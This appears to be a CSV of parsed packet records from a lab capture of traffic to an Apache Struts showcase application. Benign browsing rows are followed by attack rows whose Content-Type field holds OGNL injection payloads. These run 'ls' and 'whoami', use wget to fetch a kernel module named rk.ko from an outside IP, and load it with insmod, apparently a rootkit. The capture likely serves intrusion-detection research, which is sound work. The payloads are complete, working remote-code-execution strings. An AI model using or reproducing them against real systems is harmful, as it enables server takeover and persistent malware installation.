,content_type,dest_ip,dest_port,highest_layer,length,query_page,src_ip,timestamp
0,,172.17.0.2,8080,HTTP,766,/j,10.0.2.2,1521394900.952944
1,text/html;charset=ISO-8859-1,10.0.2.2,55952,DATA-TEXT-LINES,459,,172.17.0.2,1521394901.056015
2,,172.17.0.2,8080,HTTP,703,/struts/utils.js,10.0.2.2,1521394901.081545
3,text/javascript,10.0.2.2,55952,DATA-TEXT-LINES,59,,172.17.0.2,1521394901.083876
4,,172.17.0.2,8080,HTTP,765,/,10.0.2.2,1521394903.605212
5,text/html,10.0.2.2,55952,HTTP,211,,172.17.0.2,1521394903.606702
6,,172.17.0.2,8080,HTTP,780,/showcase.action,10.0.2.2,1521394903.610774
7,text/html;charset=ISO-8859-1,10.0.2.2,55952,DATA-TEXT-LINES,459,,172.17.0.2,1521394903.649155
8,,172.17.0.2,8080,HTTP,717,/struts/utils.js,10.0.2.2,1521394903.678907
9,text/javascript,10.0.2.2,55952,DATA-TEXT-LINES,59,,172.17.0.2,1521394903.680853
10,,172.17.0.2,8080,HTTP,854,/actionchaining/actionChain1!input.action,10.0.2.2,1521394906.801015
11,text/html;charset=ISO-8859-1,10.0.2.2,55952,DATA-TEXT-LINES,459,,172.17.0.2,1521394907.455466
12,,172.17.0.2,8080,HTTP,851,/tags/ui/actionTagExample!input.action,10.0.2.2,1521394912.048495
13,text/html;charset=ISO-8859-1,10.0.2.2,55952,DATA-TEXT-LINES,459,,172.17.0.2,1521394912.411073
14,,172.17.0.2,8080,HTTP,762,/struts/xhtml/styles.css,10.0.2.2,1521394912.431239
15,,172.17.0.2,8080,HTTP,739,/struts/utils.js,10.0.2.2,1521394912.432486
16,text/css,10.0.2.2,55952,DATA-TEXT-LINES,59,,172.17.0.2,1521394912.4345
17,text/javascript,10.0.2.2,55959,DATA-TEXT-LINES,59,,172.17.0.2,1521394912.441323
18,,172.17.0.2,8080,HTTP,838,/integration/editGangster,10.0.2.2,1521394916.704589
19,text/html;charset=ISO-8859-1,10.0.2.2,55959,DATA-TEXT-LINES,459,,172.17.0.2,1521394917.598533
20,,172.17.0.2,8080,HTTP,749,/struts/xhtml/styles.css,10.0.2.2,1521394917.615981
21,,172.17.0.2,8080,HTTP,726,/struts/utils.js,10.0.2.2,1521394917.615989
22,text/javascript,10.0.2.2,55952,DATA-TEXT-LINES,59,,172.17.0.2,1521394917.625069
23,text/css,10.0.2.2,55959,DATA-TEXT-LINES,59,,172.17.0.2,1521394917.632467
24,,172.17.0.2,8080,HTTP,843,/hangman/hangmanNonAjax.action,10.0.2.2,1521394922.304678
25,,172.17.0.2,8080,HTTP,778,/hangman/images/hangman.png,10.0.2.2,1521394922.775065
26,image/png,10.0.2.2,55952,PNG,4132,,172.17.0.2,1521394922.789445
27,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_5.png,10.0.2.2,1521394922.792394
28,image/png,10.0.2.2,55952,PNG,1542,,172.17.0.2,1521394922.798007
29,,172.17.0.2,8080,HTTP,783,/hangman/images/guesses-left.png,10.0.2.2,1521394922.80148
30,image/png,10.0.2.2,55952,PNG,2654,,172.17.0.2,1521394922.806881
31,,172.17.0.2,8080,HTTP,781,/hangman/images/scaffold_5.png,10.0.2.2,1521394922.809691
32,,172.17.0.2,8080,HTTP,776,/hangman/images/guess.png,10.0.2.2,1521394922.814667
33,,172.17.0.2,8080,HTTP,793,/hangman/images/Chalkboard_underscroll.png,10.0.2.2,1521394922.814669
34,,172.17.0.2,8080,HTTP,777,/hangman/images/choose.png,10.0.2.2,1521394922.814672
35,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_A.png,10.0.2.2,1521394922.815145
36,image/png,10.0.2.2,55968,PNG,1392,,172.17.0.2,1521394922.82085
37,image/png,10.0.2.2,55966,PNG,3182,,172.17.0.2,1521394922.822303
38,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_B.png,10.0.2.2,1521394922.823073
39,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_C.png,10.0.2.2,1521394922.824984
40,image/png,10.0.2.2,55970,PNG,3603,,172.17.0.2,1521394922.835772
41,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_D.png,10.0.2.2,1521394922.838202
42,image/png,10.0.2.2,55972,PNG,1673,,172.17.0.2,1521394922.876248
43,image/png,10.0.2.2,55952,PNG,4549,,172.17.0.2,1521394922.877706
44,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_I.png,10.0.2.2,1521394922.878182
45,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_K.png,10.0.2.2,1521394922.880002
46,image/png,10.0.2.2,55952,PNG,1713,,172.17.0.2,1521394922.886321
47,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_M.png,10.0.2.2,1521394922.888104
48,image/png,10.0.2.2,55968,PNG,1742,,172.17.0.2,1521394922.888792
49,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_N.png,10.0.2.2,1521394922.890844
50,image/png,10.0.2.2,55968,PNG,1701,,172.17.0.2,1521394922.899336
51,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_Q.png,10.0.2.2,1521394922.902633
52,image/png,10.0.2.2,55952,PNG,1635,,172.17.0.2,1521394922.906764
53,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_P.png,10.0.2.2,1521394922.908712
54,image/png,10.0.2.2,55966,PNG,1553,,172.17.0.2,1521394922.912347
55,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_F.png,10.0.2.2,1521394922.914611
56,image/png,10.0.2.2,55970,PNG,1702,,172.17.0.2,1521394922.921132
57,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_T.png,10.0.2.2,1521394922.923145
58,image/png,10.0.2.2,55972,PNG,1578,,172.17.0.2,1521394922.923502
59,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_X.png,10.0.2.2,1521394922.925232
60,image/png,10.0.2.2,55952,PNG,1653,,172.17.0.2,1521394922.936488
61,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_Y.png,10.0.2.2,1521394922.939384
62,image/png,10.0.2.2,55972,PNG,1679,,172.17.0.2,1521394922.944562
63,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_O.png,10.0.2.2,1521394922.946796
64,image/png,10.0.2.2,55972,PNG,1694,,172.17.0.2,1521394922.967698
65,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_R.png,10.0.2.2,1521394922.970352
66,image/png,10.0.2.2,55970,PNG,1566,,172.17.0.2,1521394922.973401
67,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_G.png,10.0.2.2,1521394922.975219
68,image/png,10.0.2.2,55972,PNG,1728,,172.17.0.2,1521394922.97665
69,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_E.png,10.0.2.2,1521394922.978683
70,image/png,10.0.2.2,55966,PNG,1552,,172.17.0.2,1521394922.979161
71,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_S.png,10.0.2.2,1521394922.981173
72,image/png,10.0.2.2,55966,PNG,1675,,172.17.0.2,1521394922.986969
73,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_Z.png,10.0.2.2,1521394922.988962
74,image/png,10.0.2.2,55972,PNG,1645,,172.17.0.2,1521394922.99321
75,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_V.png,10.0.2.2,1521394922.995191
76,image/png,10.0.2.2,55966,PNG,1635,,172.17.0.2,1521394922.996684
77,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_H.png,10.0.2.2,1521394922.998694
78,image/png,10.0.2.2,55972,PNG,1604,,172.17.0.2,1521394923.002779
79,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_J.png,10.0.2.2,1521394923.005131
80,image/png,10.0.2.2,55972,PNG,1507,,172.17.0.2,1521394923.009776
81,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_U.png,10.0.2.2,1521394923.011643
82,image/png,10.0.2.2,55966,PNG,1592,,172.17.0.2,1521394923.016672
83,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_L.png,10.0.2.2,1521394923.018782
84,image/png,10.0.2.2,55952,PNG,1600,,172.17.0.2,1521394923.039334
85,,172.17.0.2,8080,HTTP,783,/hangman/images/Chalkboard_W.png,10.0.2.2,1521394923.042146
86,image/png,10.0.2.2,55972,PNG,1659,,172.17.0.2,1521394923.043606
87,image/png,10.0.2.2,55952,PNG,1722,,172.17.0.2,1521394923.050232
88,image/png,10.0.2.2,55968,PNG,1756,,172.17.0.2,1521394923.052156
89,image/png,10.0.2.2,55970,PNG,1650,,172.17.0.2,1521394923.054184
90,text/html;charset=UTF-8,10.0.2.2,55959,DATA-TEXT-LINES,459,,172.17.0.2,1521394923.061624
91,image/png,10.0.2.2,55966,PNG,1534,,172.17.0.2,1521394923.069116
92,,172.17.0.2,8080,HTTP,859,/freemarker/customFreemarkerManagerDemo.action,10.0.2.2,1521394927.154014
93,text/html;charset=UTF-8,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394927.265234
94,,172.17.0.2,8080,HTTP,979,/viewSource.action?config=&className=com.opensymphony.xwork2.ActionSupport&page=/freemarker//freemarker/customFreemarkerManagerUsage.ftl,10.0.2.2,1521394928.43434
95,text/html;charset=ISO-8859-1,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394928.510017
96,,172.17.0.2,8080,HTTP,812,/showcase.jsp,10.0.2.2,1521394933.86599
97,,172.17.0.2,8080,HTTP,714,/struts/utils.js,10.0.2.2,1521394933.919997
98,text/javascript,10.0.2.2,55959,DATA-TEXT-LINES,59,,172.17.0.2,1521394933.921927
99,text/html;charset=ISO-8859-1,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394933.923712
100,,172.17.0.2,8080,HTTP,841,/freemarker/standardTags.action,10.0.2.2,1521394938.008579
101,text/html;charset=UTF-8,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394938.615525
102,,172.17.0.2,8080,HTTP,968,/viewSource.action?config=&className=org.apache.struts2.showcase.freemarker.StandardTagsAction&page=/freemarker//freemarker/standardTags.ftl,10.0.2.2,1521394942.042459
103,text/html;charset=ISO-8859-1,10.0.2.2,55966,DATA-TEXT-LINES,459,,172.17.0.2,1521394942.143351
104,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521394990.943891
105,text/html;charset=ISO-8859-1,172.17.0.1,44126,DATA-TEXT-LINES,471,,172.17.0.2,1521394990.951015
106,text/html;charset=ISO-8859-1,172.17.0.1,39926,DATA-TEXT-LINES,471,,172.17.0.2,1521394995.907189
107,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521394995.911054
108,text/html;charset=ISO-8859-1,172.17.0.1,48404,DATA-TEXT-LINES,471,,172.17.0.2,1521395001.047197
109,".multipart/form-data~${#context[""com.opensymphony.xwork2.dispatcher.HttpServletResponse""].addHeader(""LOLOLOLOLOLPAYLOADWORKEDLOLOLOLOL"",1330+7)}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521395001.050772
110,application/x-www-form-urlencoded,172.17.0.2,8080,URLENCODED-FORM,969,/integration/saveGangster.action,172.17.0.1,1521395031.895408
111,text/html;charset=ISO-8859-1,172.17.0.1,56412,DATA-TEXT-LINES,471,,172.17.0.2,1521395031.95592
112,application/x-www-form-urlencoded,172.17.0.2,8080,URLENCODED-FORM,969,/integration/saveGangster.action,172.17.0.1,1521395034.210954
113,text/html;charset=ISO-8859-1,172.17.0.1,60510,DATA-TEXT-LINES,471,,172.17.0.2,1521395034.295152
114,application/x-www-form-urlencoded,172.17.0.2,8080,URLENCODED-FORM,974,/integration/saveGangster.action,172.17.0.1,1521395037.038065
115,text/html;charset=ISO-8859-1,172.17.0.1,55308,DATA-TEXT-LINES,471,,172.17.0.2,1521395037.116765
116,application/x-www-form-urlencoded,172.17.0.2,8080,URLENCODED-FORM,979,/integration/saveGangster.action,172.17.0.1,1521395046.664477
117,text/html;charset=ISO-8859-1,172.17.0.1,36782,DATA-TEXT-LINES,471,,172.17.0.2,1521395046.744679
118,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521395061.520157
119,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521395073.091634
120,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521395109.229382
121,,162.212.156.148,80,HTTP,172,/rk.ko,172.17.0.2,1521395122.87261
122,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget http://162.212.156.148/rk.ko > rk.ko').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521395127.885892
123,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521395147.190608
124,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521395162.864978
125,"%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='insmod rk.ko.1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",172.17.0.2,8080,HTTP,66,/showcase.action,172.17.0.1,1521395163.480356
